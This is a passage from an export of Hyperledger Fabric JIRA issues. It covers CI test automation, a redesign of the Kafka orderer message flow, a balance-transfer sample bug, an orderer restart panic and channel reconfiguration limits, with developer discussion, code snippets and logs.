iners/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,"08/Nov/17 12:01 AM;jtclark;+Status Update+

Currently there a couple streams of work happening in relationship to this effort. With this JIRA task, the effort is to get our fabric-smoke-tests-verify Jenkins job to run the required PTE tests.

fabric-smoke-tests-verify is running the runSmokeTestSuite.sh script to execute the Behave feature and system tests, followed by this PTE script:

{{py.test -v --junitxml results_systest_pte.xml systest_pte.py}}

Inside this systest_pte.py script is where we want to ensure that all of the required PTE test cases are being executed from this script.;;;","08/Nov/17 12:31 AM;jtclark;[^CINotes]

Attached is the list of test cases and the commands required to run these test cases as part of the runSmokeTestSuite script.;;;","21/Feb/18 12:51 AM;jtclark;*Status Update*

Talked with [~scottz] about this task. Right now, the PTE tests work in local environments (which I will validate), but when the PTE tests run as part of the daily, or smoke tests, they do not work.

The plan is to begin with validating that the PTE tests run in a local environment. Once that's complete, then I will submit a `-1` WIP patch to allow the Jenkins sandbox to attempt to run the verification tests, which will execute the PTE tests in the sandbox. I'll observe what happens with the verification test and go from there.;;;","22/Feb/18 4:30 AM;jtclark;*Status Update*

The *fabric-test* project is installed on my development vlaunch machine at *endor.rtp.raleigh.ibm.com*. I'm using this box as my local dev environment. In order to get the {{make ci-smoke}} target to work properly, a number of pre-reqs were required (go1.9, the {{libltdl-dev}} pkg, and running {{install_behave.sh}}).

 

I'm at the point where running the smoke tests end with this failure:

{{orderer_ote.py::OTE_Orderer_Traffic_Engine::test_FAB7936_100tx_3ch_3ord_3kb FAILED}}

 

Working on figuring out the fix.;;;","28/Feb/18 1:13 AM;jtclark;*Status Update*

After speaking with [~rameshthoomu], we discovered that the daily test suite is more important to get PTE tests running from than the smoke test suite.

I've uncommented (and added) the following lines from the runDailyTestSuite.sh script to test PTE: 
{code:java}
echo ""========== System Test Performance Stress tests driven by PTE tool...""
cp -r ../../tools/PTE $WORKSPACE/gopath/src/github.com/hyperledger/fabric-test/fabric-sdk-node/test/
cd $WORKSPACE/gopath/src/github.com/hyperledger/fabric-test/fabric-sdk-node
./../pre_setup.sh && npm config set prefix ~/npm && npm install && npm install -g gulp
gulp ca || exit 1
ls
cd ../regression/daily
echo ""==========PY Test============""
py.test -v --junitxml results_systest_pte.xml systest_pte.py
{code}
After this change, I modified the fabric-test-daily job on the Jenkins sandbox to point to my local dev environment that has this change. Upon running the job, the test HALTS at the PTE testing step.

[~rameshthoomu] has confirmed that this is the behavior that they had seen before, and in order to resolve this, we need to capture output logs and debug msgs to determine why it's failing.  This is my next step.;;;","09/Mar/18 12:02 AM;jtclark;Still trying to determine why the test scenarios cause the Jenkins job to just ""halt"". 

Here's how we are +currently+ attempting to get PTE tests to run, and/or capture any output from the success/failure of the PTE script invocation:

0 - The Jenkins sandbox job that is triggering PTE is *fabric-test-daily-s390x*, which runs the runDailyTestSuite.sh script that calls systest_pte.py script.

1 - I removed the *@unittest.skip(""skipping; WIP"")* decorator from *ONE* of the PTE test scenarios located inside the systest_pte.py file. The test scenario that should run is: FAB-3833 and FAB-3810.

2- Using my [local dev copy of fabric-test,|https://github.com/jasontclark/fabric-test-localdev] we've tried to capture the output from the FAB-3833 scenario script using the following redirection:
{code:java}
./test_driver.sh -n -m FAB-3833-2i -p -c samplecc -t FAB-3810-2q >% 3833.log
{code}
3 - When I trigger the build from the sandbox, the trailing output is as follows:
{code:java}
....
14:59:54 + go version
14:59:54 /tmp/jenkins2480226777102142441.sh: line 8: go: command not found
14:59:54 Build step 'Execute shell' marked build as failure
14:59:54 $ ssh-agent -k
14:59:54 unset SSH_AUTH_SOCK;
14:59:54 unset SSH_AGENT_PID;
14:59:54 echo Agent pid 65333 killed;
14:59:55 [ssh-agent] Stopped.
14:59:55 Archiving artifacts
14:59:55 Finished: FAILURE
{code};;;","10/Mar/18 1:15 AM;jtclark;Worked with [~rameshthoomu] to fix this gopath issue, and dongming to redirect the output of the 3833 PTE test scenario to a log file.  The results are found here:

[https://jenkins.hyperledger.org/sandbox/job/fabric-test-daily-s390x/18/artifact/gopath/src/github.com/hyperledger/fabric-test/fabric-sdk-node/test/PTE/CITest/scripts/3833.log]

Sharing this with dongming to see if he can help us figure out why the tests are not completing.;;;","27/Mar/18 7:45 AM;scottz;https://gerrit.hyperledger.org/r/#/c/19755/;;;","29/Mar/18 1:44 AM;jtclark;The patch is currently *IN REVIEW*: https://gerrit.hyperledger.org/r/#/c/19755/.

Talked with [~scottz], [~dongming], and [~rameshthoomu] about the next steps on this task.

As discussed:

1. The initial focus will be on getting the test scenarios working as part of the DAILY test suite. 

2. The FAB-3833 PTE test scenario works on the Jenkins sandbox, but as [~dongming] discovered, a number of modifications to the runDailyTestSuite.sh script has to be added, as well as a hardcoded GOPATH in the sample chaincode create JSON file.  

3. The patch that has been submitted refers to the GOPATH in an environment variable, but [~dongming] expresses concerns with this approach, and is looking for an alternative way to dynamically inject the correct GOPATH to use.

Next Steps:

- Waiting to hear back from @dongming to see how we can rectify the GOPATH issue
- Test what @dongming comes up with by *temporarily* adding it as a smoke test to validate that the 3833 PTE test scenario successfully runs on the Jenkins host.
- Re-submit the patch (to include this test as a DAILY test)
;;;","08/May/18 7:28 PM;jtclark;[https://gerrit.hyperledger.org/r/#/c/19755/] has been *MERGED.*;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move kafka to optimized message flow,FAB-5284,19206,19176,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guoger,kchristidis,kchristidis,12/Jul/17 12:34 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Sep/17 11:00 PM,v1.0.0,,,v1.1.0,,fabric-orderer,,,,,,0,kafka,performance,Release-planning-1.1,,,,"h2. This is how the Kafka-based orderer should work when this JIRA is completed.
h3. Note:
 * The pieces that should be remove are -stricken through-.
 * The pieces that need to be added are *displayed in bold*.

h3. Flow:
 # Add the following fields to the KafkaMessageRegular definition:
 ** uint64 config_seq = 2
 ** byte{color:#333333}s config_update = 3{color}
 ** int32 class = 4 (where class is an enum with UNKNOWN, CONFIG, NORMAL values as described in: https://jira.hyperledger.org/browse/FAB-5284?focusedCommentId=28622&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-28622
 # Broadcast component receives message
 # Check whether it's a CONFIG_UPDATE message
 ## If it is a CONFIG_UPDATE message:
 ### Propose it to the message processor, get back the resulting config message, and a config sequence number
 ### *Pass the config update, config message, and config sequence number to the processor's Configure method which does two things: (a) populates the KafkaRegular message (all 4 fields), and (b) enqueues it for ordering*
 ## If it is a NORMAL message:
 ### Run it through the message processor to get back a config sequence number
 ### *Pass the normal message and the config sequence number to the processor's Order method which does two things: (a) populates the KafkaRegular message (3 out of 4 fields, since the config field here remains empty), and (b) enqueues it for ordering*
 # -Invoke the processor's Order on the message and config sequence number: this wraps the original message (config update or normal message) and config sequence number into a KafkaRegular message, then- Enqueueing simply posts the KafkaRegular message to the channel's Kafka partition for ordering
 # Consume the partition above, read the message from the ordered stream
 # *Retrieve the current config sequence number*
 # -Have the support classify the message to identify its type- *Read the message's class field*
 ## *If it is UNKNOWN, run support.ClassifyMessage to identify its type*
 ### *If it's a CONFIG or ORDERER_TX messag{color:#333333}e, run configtx.Validate on it, and discard if you get an error or do as 2.2.1-2.2.4 below{color}*
 ### *If it's a NORMAL message, do as as 3.1.1-3.1.2 below*
 ## *If it is a CONFIG_UPDATE message:*
 ### *If the config sequence has advanced*
 #### *ProcessConfigUpdateMsg again*
 #### *Discard if an error is returned*
 #### *Otherwise run through the processor's Configure method and re-order*
 ### *Otherwise:*
 #### Invoke the block cutter to cut the pending batch into a block and write that block
 #### Place the config update message into a block
 #### Trigger updates from this config message (i.e. create new chain, or update config of existing chain)
 #### Write block
 ## *If it is a NORMAL message:*
 ### *If the config sequence has advanced:*
 #### *ProcessNormal again and di**scard if an error is returned*
 #### *Otherwise do as Step 2.1-2.1 below*
 ### *Otherwise:*
 #### Invoke the block cutter to have the message ordered
 #### If this returns batches, then invoke WriteBlock to append them to disk",,caoyu,guoger,jyellick,kchristidis,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5720,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy83z:",,,,,,,,,,,,,,,,,,,,,,,caoyu,guoger,jyellick,kchristidis,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Jul/17 6:20 AM;kchristidis;[~jyellick] suggests that we extend the `KafkaMessage` proto definition with a `class` field that annotates the message type, so as to get v1.0 OSNs to coexist with v1.1 OSNs. I like this idea.

v1.0 OSNs do not recognize this field and automatically set it to 0. We could then have a mapping along the lines of:
 * 0 - unknown type
 * 1 - normal message
 * 2 - config message

So in the revised flow, the v1.1 OSNs will proceed as follows right after calling the `Sequence()` method on the orderer messages:
 * If type is 0, run ClassifyMsg to determine type, then:
 * If type is 1, proceed as in normal_msg_flow
 * If type is 2, proceed as in config_msg_flow;;;","08/Aug/17 7:28 PM;guoger;To adapt to new message flow, {{ConfigSeq}} should be embedded into {{KafkaMessage}}, so that consenter could decide whether to re-validate message.
{code:java}
// KafkaMessageRegular wraps a marshalled envelope.
message KafkaMessageRegular {
    bytes payload = 1;
    uint64 config_seq = 2;
}
{code}

the purpose of allowing a _mixed cluster_, a.k.a _get v1.0 OSNs to coexist with v1.1 OSNs_, is for upgrading, correct?

I'm not entirely sure why we need to inject message type (NORMAL/CONFIG). (I know we do that for solo already, but also not clear to me). I feel it's OK to use {{ClassifyMsg}} to dispatch messages in consenter?

Suppose we want to do that, we will end up with following proto:
{code:java}
// KafkaMessage is a wrapper type for the messages
// that the Kafka-based orderer deals with.
message KafkaMessage {
    oneof Type {
        KafkaMessageRegular regular = 1;
        KafkaMessageTimeToCut time_to_cut = 2;
        KafkaMessageConnect connect = 3;
    }
    enum Class {
        UNKNOWN = 0;
        NORMAL = 1;
        CONFIG = 2;
    }
    Class class = 4;
}

// KafkaMessageRegular wraps a marshalled envelope.
message KafkaMessageRegular {
    bytes payload = 1;
    uint64 config_seq = 2;
}
{code}

Ideally, we could have:
{code:java}
// KafkaMessage is a wrapper type for the messages
// that the Kafka-based orderer deals with.
message KafkaMessage {
    oneof Type {
        KafkaMessageNormal normal = 1;
        KafkaMessageConfig connect = 3;
        KafkaMessageTimeToCut time_to_cut = 2;
        KafkaMessageConnect connect = 3;
    }
}
{code}
Even though there's no way we could make it compatible with v1.0, I guess this is not off the table for v2.0?

Let me know what you think [~kchristidis][~jyellick][~sanchezl];;;","08/Aug/17 11:25 PM;jyellick;[~guoger] I think there may be a typo in your comment above, in particular for the second {{KafkaMessage}} definition, you define the {{connect}} field twice.

It would of course be possible to re-run 'classify' on the messages, but this would be one of the redundant checks we hope to eliminate.

Additionally, recall that for the config update path, as seen in the diagram in the parent story, revalidating a config update involves generating a new config transaction to re-order, so we actually need to pass two messages, not just one in the config case.

The idea with the classification enum is that we can identity messages which were processed by a v1.0 OSN and were not tagged with classification messages.  For these messages, we must re-run the classify msg code.;;;","09/Aug/17 11:44 AM;kchristidis;So a quick overview which may or may not be useful. (And as always, I suspect that it takes longer to write this prose, than actually write the code.)
h2. How v1.0. of the Kafka-based orderer works
 # Broadcast component receives message
 # If it is a CONFIG_UPDATE message or not turn it into either an existing channel configuration message, or a new channel creation one
 # Apply filters
 # Wrap message into a KafkaRegular message
 # Post KafkaRegular message to the channel's Kafka partition for ordering
 # Consume the partition above, read the message from the ordered stream
 # Invoke the block cutter to order the message
 # If this returns batches (and committers), then invoke WriteBlock:
 ## Run the respective committers of the batches
 ## Append batches to disk

h2. How v1.1 of the Kafka-based orderer works right now

(Jason was right to do this so as to remove as much as legacy code as possible.)
 # Broadcast component receives message
 # Check whether it's a CONFIG_UPDATE message or not
 ## If it is a CONFIG_UPDATE message:
 ### Propose it to the message processor, get back the resulting config message, and a config sequence number
 ## If it is a NORMAL message:
 ### Run it through the message processor to get back a config sequence number
 # Invoke the processor's Order on the message and config sequence number: this wraps the original message (config update or normal message) and config sequence number into a KafkaRegular message, then posts this KafkaRegular message to the channel's Kafka partition for ordering
 # Consume the partition above, read the message from the ordered stream
 # Have the support classify the message to identify its type
 ## If it is a CONFIG_UPDATE message:
 ### ProcessNormal, i.e. get config sequence and apply chain filters
 ### Invoke the block cutter to cut the pending batch into a block and write that block
 ### Place the config update message into a block
 ### Trigger updates from this config message (i.e. create new chain, or update config of existing chain)
 ### Write block
 ## If it is a NORMAL message:
 ### ProcessNormal, i.e. get config sequence and apply chain filters
 ### Invoke the block cutter to have the message ordered
 ### If this returns batches, then invoke WriteBlock to append them to disk

h2. How v1.1 of the Kafka-based orderer should work when this JIRA is completed (additions in *bold*, corrections in {color:#ff0000}red{color})
 # Add the following fields to the KafkaMessageRegular definition:
 ## uint64 config_seq = 2
 ## bytes {color:#ff0000}config_update{color} = 3
 ## int32 class = 4 (where class is an enum with UNKNOWN, CONFIG, NORMAL values as described here)
 # Broadcast component receives message
 # Check whether it's a CONFIG_UPDATE message or not
 ## If it is a CONFIG_UPDATE message:
 ### Propose it to the message processor, get back the resulting config message, and a config sequence number
 ### *Pass the config update, config message, and config sequence number to the processor's Configure method which does two things: (a) populates the KafkaRegular message (all 4 fields), and (b) enqueues it for ordering.*
 ## If it is a NORMAL message:
 ### Run it through the message processor to get back a config sequence number
 ### *Pass the normal message and the config sequence number to the processor's Order method which does two things: (a) populates the KafkaRegular message (3 out of 4 fields, since the config field here remains empty), and (b) enqueues it for ordering.*
 # -Invoke the processor's Order on the message and config sequence number: this wraps the original message (config update or normal message) and config sequence number into a KafkaRegular message, then- Enqueueing simply posts the KafkaRegular message to the channel's Kafka partition for ordering
 # Consume the partition above, read the message from the ordered stream
 # *Retrieve the current config sequence number*
 # -Have the support classify the message to identify its type- *Read the message's class field*
 ## *If it's UNKNOWN, run support.ClassifyMessage to identify its type*
 ### *If it's a CONFIG message, {color:#ff0000}run configtx.Validate() on it, and discard if you get an error or do as 2.2.1-2.2.4 below{color}*
 ### *If it's a NORMAL message, do as as 3.1.1-3.1.2 below*
 ## *If it is a CONFIG_UPDATE message:*
 ### *If the config sequence has advanced*
 #### *ProcessConfigUpdateMsg again*
 #### *Discard if an error is returned*
 #### *Otherwise run through the processor's Configure method and re-order*
 ### *Otherwise:*
 #### Invoke the block cutter to cut the pending batch into a block and write that block
 #### Place the config update message into a block
 #### Trigger updates from this config message (i.e. create new chain, or update config of existing chain)
 #### Write block
 ## *If it is a NORMAL message:*
 ### *If the config sequence has advanced:*
 #### *ProcessNormal again and di**scard if an error is returned*
 #### *Otherwise do as Step 2.1-2.1 below*
 ### *Otherwise:*
 #### Invoke the block cutter to have the message ordered
 #### If this returns batches, then invoke WriteBlock to append them to disk

 ;;;","09/Aug/17 11:56 AM;kchristidis;A couple of observations on the flow above:
 # I'll be surprised if there are no flaws here, but this hopefully provides a decent outline to keep you going
 # I don't quite see why the class field should be added to the KafkaMessage proto definition instead of the KafkaMessageRegular one;;;","09/Aug/17 1:14 PM;guoger;bq. 4. Invoke the processor's Order on the message and config sequence number: this wraps the original message (config update or normal message) and config sequence number into a KafkaRegular message, then Enqueueing simply posts the KafkaRegular message to the channel's Kafka partition for ordering
I suppose this should be
bq. 4. Invoke the processor's -Order- {{Configure}} on the messages and config sequence number: this wraps the original message (config update or normal message) *and config message* and config sequence number into a KafkaRegular message, then Enqueueing simply posts the KafkaRegular message to the channel's Kafka partition for ordering
{{Configure}} and {{Order}} would produce {{KafkaMessageRegular}} respectively, and {{enqueue}} simply takes it and posts to Kafka partition.

The protobuf message looks like:
{code:java}
// KafkaMessage is a wrapper type for the messages
// that the Kafka-based orderer deals with.
message KafkaMessage {
    oneof Type {
        KafkaMessageRegular regular = 1;
        KafkaMessageTimeToCut time_to_cut = 2;
        KafkaMessageConnect connect = 3;
    }
}

// KafkaMessageRegular wraps a marshalled envelope.
message KafkaMessageRegular {
    enum Class {
        UNKNOWN = 0;
        NORMAL = 1;
        CONFIG = 2;
    }
    bytes payload = 1;
    uint64 config_seq = 2;
    bytes config = 3;
    Class class = 4;
}
{code}
Is there a particular reason you use {{in32}} for {{class}}, instead of an {{Enum}}?;;;","09/Aug/17 1:51 PM;kchristidis;Jay: Half of that step was supposed to be striked through. I updated the original message. In short, both processor.Configure and processor.Order should create KafkaMessageRegular and then enqueue(KafkaMessageRegular). In the Configure case, the message will have all 4 of its fields set. In the Order case there is no Config message to fill in, so only 3 out of 4 fields are set.

> Is there a particular reason you use {{in32}} for {{class}}, instead of an {{Enum}}?

No particular reason, was just writing this as I was thinking it. Enum is the better choice here, you are right.;;;","09/Aug/17 3:36 PM;guoger;{quote}# If it's UNKNOWN, run support.ClassifyMessage to identify its type
## If it's a CONFIG message, do as 2.1.1-2.1.3 below
## If it's a NORMAL message, do as as 3.1.1-3.1.2 below{quote}
Since {{ConfigSeq}} is not available in the {{KafkaMessageRegular}} of v1.0 orderer, I think we should *always* re-validate message of {{UNKNOWN}} type?;;;","10/Aug/17 10:40 AM;kchristidis;> Since {{ConfigSeq}} is not available in the {{KafkaMessageRegular}} of v1.0 orderer, I think we should *always* re-validate message of {{UNKNOWN}} type?

Correct. Updated the write-up above, look for corrections/updates with {color:#ff0000}red color{color}.;;;","17/Aug/17 12:17 AM;guoger;https://gerrit.hyperledger.org/r/#/c/12507/;;;","08/Sep/17 1:04 PM;guoger;patch chain start at: https://gerrit.hyperledger.org/r/#/c/12729/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,
balance-transfer instantiate chaincode not correctly,FAB-5285,19207,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yuki-kon,bh4rtp,bh4rtp,12/Jul/17 4:59 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Nov/17 7:24 AM,,,,v1.0.5,,fabric-samples,,,,,,0,,,,,,,"curl -s -X POST \
  http://localhost:4000/channels/mychannel/chaincodes \
  -H ""authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE0OTQ4NjU1OTEsInVzZXJuYW1lIjoiSmltIiwib3JnTmFtZSI6Im9yZzEiLCJpYXQiOjE0OTQ4NjE5OTF9.yWaJhFDuTvMQRaZIqg20Is5t-JJ_1BP58yrNLOKxtNI"" \
  -H ""content-type: application/json"" \
  -d '{
	""peers"": [""localhost:7051""],
	""chaincodeName"":""mycc"",
	""chaincodeVersion"":""v0"",
	""functionName"":""init"",
	""args"":[""a"",""100"",""b"",""200""]
}'
The document says this will instantiate the chaincode on peer0 of org1, but actually peer1 of org1 is also instantiated. 
allen@mangr:~$ docker images
REPOSITORY                           TAG                             IMAGE ID            CREATED             SIZE
dev-peer0.org1.example.com-mycc-v0   latest                          e86e8d8cfb19        26 seconds ago      186MB
dev-peer1.org1.example.com-mycc-v0   latest                          4102a4442cd5        26 seconds ago      186MB",,bh4rtp,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy847:",,,,,,,,,,,,,,,,,,,,,,,bh4rtp,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Aug/17 10:08 AM;yuki-kon;CR is posted here: https://gerrit.hyperledger.org/r/#/c/12805/;;;","11/Nov/17 7:24 AM;yuki-kon;This JIRA is out of date because balance-transfer was totally updated to catch up v1.1-preview by this CR ([https://gerrit.hyperledger.org/r/#/c/14977/]).
 This JIRA should be closed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Orderer panic on restart,FAB-5286,19208,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,mffrench,mffrench,mffrench,12/Jul/17 5:05 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,29/Sep/17 12:43 AM,v1.0.0,v1.0.0-alpha2,,Unverifiable,,fabric-orderer,,,,,,0,,,,,,,"Hi,

when restarting Orderer Solo with ledger type configured as file, I'm getting a panic on restart (see error trace bellow - I still need to get some easy way to reproduce the issue out of our application). 

I'd like to know, what would be the consequence on the blockchain if I remove the orderer side ledger to enable restart of this component ? As ledger are also stored on the peer side I'm not sure to understand the need to store it on the orderer side also. Is there some available doc explaining the reason to store ledger on the orderer side ?


Best,


{code:java}
2017-06-30 10:00:21.127 UTC [orderer/main] main -> INFO 001 Starting orderer with TLS enabled
2017-06-30 10:00:21.210 UTC [msp] getMspConfig -> INFO 002 MSP configuration file not found at [/etc/hyperledger/fabric/orderer/msp/config.yaml]: [stat /etc/hyperledger/fabric/orderer/msp/config.yaml: no such file or directory]
2017-06-30 10:00:21.276 UTC [orderer/main] main -> INFO 003 Not bootstrapping because of existing chains
2017-06-30 10:00:21.294 UTC [orderer/multichain] newLedgerResources -> CRIT 004 Error creating configtx manager and handlers: Bad envelope: Not a tx of type CONFIG
panic: Error creating configtx manager and handlers: Bad envelope: Not a tx of type CONFIG

goroutine 1 [running]:
panic(0xb035e0, 0xc420349420)
/opt/go/src/runtime/panic.go:500 +0x1a1
github.com/hyperledger/fabric/vendor/github.com/op/go-logging.(*Logger).Panicf(0xc4201b98c0, 0xc3a748, 0x30, 0xc420349370, 0x1, 0x1)
/opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/op/go-logging/logger.go:194 +0x127
github.com/hyperledger/fabric/orderer/multichain.(*multiLedger).newLedgerResources(0xc420338000, 0xc420257440, 0xc420257440)
/opt/gopath/src/github.com/hyperledger/fabric/orderer/multichain/manager.go:159 +0x393
github.com/hyperledger/fabric/orderer/multichain.NewManagerImpl(0x11b03c0, 0xc420358220, 0xc4202565a0, 0x11adbc0, 0x11f4980, 0x0, 0x0)
/opt/gopath/src/github.com/hyperledger/fabric/orderer/multichain/manager.go:109 +0x23b
main.main()
/opt/gopath/src/github.com/hyperledger/fabric/orderer/main.go:174 +0x179d
{code}",,kchristidis,mffrench,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy84f:",,,,,,,,,,,,,,,,,,,,,,,kchristidis,mffrench,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Jul/17 10:16 PM;kchristidis;> I'd like to know, what would be the consequence on the blockchain if I remove the orderer side ledger to enable restart of this component?

If you remove the orderer-side ledger (and still keep the genesis block around), your orderer will start producing a broken chain. Suppose it produced blocks 1-2-3. You stop the orderer, remove the ledger, restart the orderer with just the genesis block. The next block that the orderer creates is block 1, but this time it's different to the original block 1. You now have a broken chain.

> As ledger are also stored on the peer side I'm not sure to understand the need to store it on the orderer side also.

New org (`orgFoo`) joins with genesis block, how does it catch up to the most recent block? (It cannot reach out to the other orgs in the channel for gossip because orgFoo's gossip module is rejecting the ""join"" channel call because it cannot find `orgFoo`'s info in the genesis block.)

This is why the ordering service needs to keep a copy of the ledger – to allow syncing. (BTW, we'll be working on archiving soon, which means the orderer won't have to keep the entire ledger, but it'll be able to prune it to configuration blocks.);;;","12/Jul/17 10:18 PM;kchristidis;Any particular reason you're still on alpha-2? Please switch to 1.0.

It's not entirely clear to me whether you were modifying the ledger on the orderer side when you got this error. (As we explained above, this is not allowed.) The error message seems to indicate that you're pointing the orderer to a directory that no longer holds a ledger beginning with a config (genesis) block.

If you did modify the ledger, let's please close this JIRA.;;;","15/Jul/17 4:22 AM;mffrench;Thank you for your answers [~kchristidis]. The orderer ledger is configured as a docker volume pointing to a dedicated directory on the host to store it. We do same for the configuration folder :
{code:java}
volumes:
- ./tmp/conf/Org0/o0:/etc/hyperledger/fabric/orderer
- ./tmp/data/Org0/o0/ledger:/var/hyperledger/production/orderer 
{code}
To reproduce the issue I just docker-compose stop / rm the orderer container and docker-compose up -d again several times. I didn't touch anything in the ledger directory.

That said, I did my test on OSX and some time I notice Docker issue on Volume (where the container don't see the volume configured even if it exists on the host). I will continue investigate this issue and particularly to be sure this bug is not derived from this docker volume issue. 

We're still on alpha2 because we didn't get the time to migrate on beta or new v1.  



About orderer ledger, your input was pretty interesting. Is this the same behavior with Kafka ordering ? Is there some documentation about ledger persistence on the orderer (solo or kafka) ? ;;;","15/Jul/17 5:24 AM;kchristidis;Thanks for following up on this.

I'm tempted to say this might be a Docker issue, as I cannot think of a reason our code would fail because of this.

For good measure, I would also move the the host directory to a path outside of `/tmp` (if you're on `/tmp` – that's not crystal clear).
{quote}About orderer ledger, your input was pretty interesting. Is this the same behavior with Kafka ordering ? Is there some documentation about ledger persistence on the orderer (solo or kafka) ?
{quote}
I captured all the thinking that went behind the Kafka-based solution here: [https://docs.google.com/document/d/1vNMaM7XhOlu9tB_10dKnlrhy5d7b1u8lSY8a-kVjCO4/edit]

This covers the need for a ledger at the orderer.;;;","15/Jul/17 5:26 AM;kchristidis;I'm assigning this JIRA to you – feel free to post your findings when you got them.;;;","15/Jul/17 4:51 PM;mffrench;FYI : the host directory isn't in /tmp but in ./tmp where tmp is a subdirectory of my development directory. Will come back to you when I'm sure this is or not a docker issue.  ;;;","15/Jul/17 11:47 PM;kchristidis;Ah, got it, thanks for that update.;;;","11/Aug/17 10:36 PM;kchristidis;[~mffrench]: Any updates on this one? If it cannot be reproduced, or is not being investigated I propose that we close.;;;","11/Aug/17 10:42 PM;mffrench;Hi Kostas,

I just didn't get the time to have a new check on this issue - currently I just avoid restart my pre-prod orderer.

Anyway, if you want you can close it if you prefer. When things will calm down on my current project I will take time to upgrade to new fabric version, redo the test and upgrade this ticket to tell about my last tests (reproduced or not).

Kind regards,

 ;;;","11/Aug/17 10:47 PM;kchristidis;Ah, no problem, if you plan to look into this, we'll leave it open, sure.

(Just wanted to make sure it's not forgotten. Will check back in 6 weeks or so.);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow peer to override channel configuration (since it is not yet possible to join channel from latest config block),FAB-5288,19210,,Story,To Do,FAB,Fabric,software,denyeart,,,Highest,,mastersingh24,yacovm,yacovm,12/Jul/17 7:10 PM,25/Jun/20 7:32 PM,28/Oct/23 3:00 AM,,v1.0.0,,,v2.0.0,,fabric-peer,,,,,,6,,,,,,,"This JIRA item summarizes issues regarding to addition of new peers and/or new organizations to a channel, and discusses solutions for them and tracks their JIRA items.

Currently, there are several problems with regard to channel reconfiguration, that all stem from the fact that when a peer joins the channel - it is given the first configuration block (the genesis block):
 # The certificates (TLS or signing identity certificates) of the orderers cannot be changed, otherwise the peer would not be able to connect to any *ordering service node* (hereafter - *OSN*) or verify the blocks from any OSN.
 # The endpoints of the OSNs shouldn't change much - if all are changed then a peer that joins the channel would not be able to connect to *any* OSN at all, and would have to rely on receiving blocks from other peers in order to obtain the latest configuration block that would connect it to the peers.
 # When a peer that belongs to an org that wasn't a channel member at channel creation is joined the channel, the gossip layer rejects the join channel and is only updated via direct connection to the ordering service for that peer - FAB-5246
 # The delivery service in the peer doesn't support dynamic update of OSN endpoints, and requires a restart in order to do that - FAB-5157
 This item doesn't require special architectural change in order to address it ([~C0rWin] correct me if I'm wrong)

*Possible solution for 1,2,3:*
